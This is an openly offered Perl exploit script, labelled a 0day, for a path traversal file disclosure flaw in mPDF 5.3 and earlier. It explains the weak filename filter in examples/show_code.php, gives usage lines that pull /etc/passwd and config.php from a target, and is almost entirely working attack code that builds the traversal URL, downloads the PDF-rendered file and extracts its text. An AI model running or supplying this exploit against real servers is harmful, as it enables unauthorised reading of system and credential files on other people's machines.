#!/usr/bin/perl -U
=head1 TITLE
 
mPDF <= 5.3 File Disclosure Exploit (0day)
 
=head2 SYNOPSIS
 
-- examples/show_code.php --
 
preg_match('/example[0]{0,1}(\d+)_(.*?)\.php/',$filename,$m); <--- URI unproperly filtered.
$num = intval($m[1]);
$title = ucfirst(preg_replace('/_/',' ',$m[2]));
 
if (!$num || !$title) { die("Invalid file"); }
 
=head2 DESCRIPTION
 
This vulnerability, due to a weak filter, lets you download any unprotected remote
content, under PDF format.
The exploit may not work, depending on the set up htaccess/chmod rules on the
remote server.
 
=head2 USAGE
 
perl exploit.pl -r http://www.example.com/mpdf53/ ../config.php
perl exploit.pl -a http://www.example.com/mpdf53/ /etc/passwd
 
Requiered modules:
PDF::OCR2
LWP::Simple
File::Type
 
Download a module:
sudo cpan -fi install Module::Name
 
=head3 Author
 
Zadyree ~ 3LRVS Team | Blog: z4d.tuxfamily.org/blog
 
=head3 Thanks
 
PHDays CTF - Yes, CTFs sometime do give you 0dayz
3LRVS Team - Support
 
=cut
 
#************* Configuration **************#
my $pdf_file = '/tmp/b00m.pdf';
$PDF::OCR2::CHECK_PDF = 0;
$del_temp_file = 1;
#******************************************#
 
 
use 5.010;
use PDF::OCR2;
use Getopt::Std;
use LWP::Simple;
use File::Type;
use constant TRUE => 1;
use constant FALSE => 0;
 
help() unless (@ARGV >= 2);
 
my (%optz, $uri);
getopts('rah', \%optz);
my $relative = $optz{'r'};
my $absolute = $optz{'a'};
my $help = $optz{'h'};
help() unless ($absolute || $relatife);
 
my ($purl, $fpath) = @ARGV;
 
my $name = $purl;
$name =~ s{http://(.+?)/.*} {$1};
$name .= ("_" . localtime(time) . ".txt");
 
 
$uri = '/examples/show_code.php?filename=example03_LRVS.php/../../../../../../../../' if ($absolute);
$uri = '/examples/show_code.php?filename=example03_LRVS.php/../../' if ($relative);
 
help() unless ($uri);
 
my $furl = $purl . $uri . $fpath;
$furl =~ s#(//)#$i++?"/":$1#eg; # Yeah that's twisted.
 
say "[*]Retrieving content...";
my $file = make_file(get($furl));
die "[-]The stream you requested is not well formatted (forbidden page, etc).\012" unless is_pdf($file);
 
say "[+]OK\012[*]Converting format...";
$pdf = PDF::OCR2->new($file);
 
my $text = $pdf->text;
$text =~ s/[^\x0A-\x7F]+?//gm;
 
open(my $fh, '>', $name);
print $fh $text;
close($fh);
 
say "[+]OK\012[+]Content successfully extracted!\nFile: ", $name;
 
unlink($pdf_file) if ($del_temp_file == TRUE);
 
 
 
sub make_file {
    my $content = shift;
    open($fh, '>', $pdf_file);
    print $fh $content;
    close($fh);
    return($pdf_file);
}
 
sub is_pdf {
    my $checked_file = shift;
    my $ft = File::Type->new();
    return(1) if ($ft->mime_type($checked_file) eq "application/pdf");
    return(0);
}
 
help() if ($help);
 
sub help {
    say <<"EOF";
 
Usage: perl $0 [-r|-a] http://[mPDF URL] <file_to_read>
 
Details:                  
                           -r : Relative path (ex: ../file.php)
                           -a : Absolute path (ex: /etc/file.zd)
 
For any more information, feel free to contact ZadYree
Happy hacking!
EOF
    exit(0);
}

